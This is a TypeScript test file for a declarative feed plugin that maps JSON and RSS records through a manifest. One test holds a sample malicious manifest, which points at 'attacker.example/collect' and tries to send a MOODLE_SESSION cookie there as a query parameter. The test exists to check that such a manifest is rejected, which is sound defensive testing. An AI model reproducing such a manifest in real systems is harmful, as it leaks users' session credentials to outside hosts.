import { describe, expect, it, vi } from "vitest";
import { DeclarativePlugin, parsePluginManifest, pluginBindings, type PluginManifest } from "../src/plugins/declarative/plugin";

describe("DeclarativePlugin.pull", () => {
  it("maps JSON records and facets using a manifest", async () => {
    const manifest: PluginManifest = {
      version: 1,
      id: "example-issues",
      name: "Example issues",
      format: "json",
      url: "https://api.example.com/issues",
      itemsPath: "data.issues",
      auth: { type: "bearer", binding: "PLUGIN_SECRET_EXAMPLE" },
      mapping: {
        id: { path: "id" },
        kind: { value: "issue" },
        title: { path: "summary" },
        timestamp: { path: "created_at" },
        url: { path: "html_url" },
        body: { path: "description" },
        facets: [
          {
            type: "deadline",
            fields: { dueAt: { path: "due_at" } },
            capabilities: [{ name: "has-deadline", primitive: "temporal", field: "dueAt" }],
          },
        ],
      },
    };
    const fetcher = vi.fn<typeof fetch>().mockResolvedValue(
      Response.json({
        data: {
          issues: [
            {
              id: 42,
              summary: "Renew certificate",
              description: "The production certificate expires soon.",
              created_at: "2026-07-01T00:00:00.000Z",
              due_at: "2026-07-20T00:00:00.000Z",
              html_url: "https://example.com/issues/42",
            },
          ],
        },
      }),
    );
    const plugin = new DeclarativePlugin(manifest, { PLUGIN_SECRET_EXAMPLE: "secret" }, fetcher);

    const items = await plugin.pull();

    expect(items).toEqual([
      expect.objectContaining({
        id: "42",
        source: "example-issues",
        kind: "issue",
        title: "Renew certificate",
        timestamp: "2026-07-01T00:00:00.000Z",
        facets: [
          {
            type: "deadline",
            data: { dueAt: "2026-07-20T00:00:00.000Z" },
            capabilities: [{ name: "has-deadline", primitive: "temporal", field: "dueAt" }],
          },
        ],
      }),
    ]);
    expect(fetcher.mock.calls[0]?.[1]?.headers).toMatchObject({ Authorization: "Bearer secret" });
  });

  it("rejects a manifest whose auth binding escapes the plugin secret namespace", () => {
    const malicious = {
      version: 1,
      id: "exfil",
      name: "x",
      format: "json",
      url: "https://attacker.example/collect",
      auth: { type: "query", name: "k", binding: "MOODLE_SESSION" },
      mapping: { id: { path: "id" }, kind: { value: "x" }, title: { path: "t" }, timestamp: { path: "ts" } },
    };
    expect(() => parsePluginManifest(malicious)).toThrow(/PLUGIN_SECRET_/);
  });

  it("only exposes PLUGIN_SECRET_* env entries to declarative plugins", () => {
    expect(pluginBindings({ MOODLE_SESSION: "cookie", ADMIN_TOKEN: "root", PLUGIN_SECRET_FEED: "ok" })).toEqual({
      PLUGIN_SECRET_FEED: "ok",
    });
  });

  it("normalizes RSS entries before applying the manifest", async () => {
    const manifest: PluginManifest = {
      version: 1,
      id: "example-feed",
      name: "Example feed",
      format: "rss",
      url: "https://example.com/feed.xml",
      mapping: {
        id: { path: "guid" },
        kind: { value: "article" },
        title: { path: "title" },
        timestamp: { path: "publishedAt" },
        url: { path: "link" },
        body: { path: "description" },
      },
    };
    const fetcher = vi.fn<typeof fetch>().mockResolvedValue(
      new Response(
        `<?xml version="1.0"?><rss version="2.0"><channel><item>
          <guid>post-1</guid><title>Release notes</title>
          <link>https://example.com/posts/1</link>
          <pubDate>Sun, 12 Jul 2026 10:00:00 GMT</pubDate>
          <description>Version 1 is live.</description>
        </item></channel></rss>`,
        { headers: { "content-type": "application/rss+xml" } },
      ),
    );

    const items = await new DeclarativePlugin(manifest, {}, fetcher).pull();

    expect(items).toEqual([
      expect.objectContaining({
        id: "post-1",
        source: "example-feed",
        kind: "article",
        title: "Release notes",
        timestamp: "2026-07-12T10:00:00.000Z",
        url: "https://example.com/posts/1",
        body: "Version 1 is live.",
      }),
    ]);
  });
});
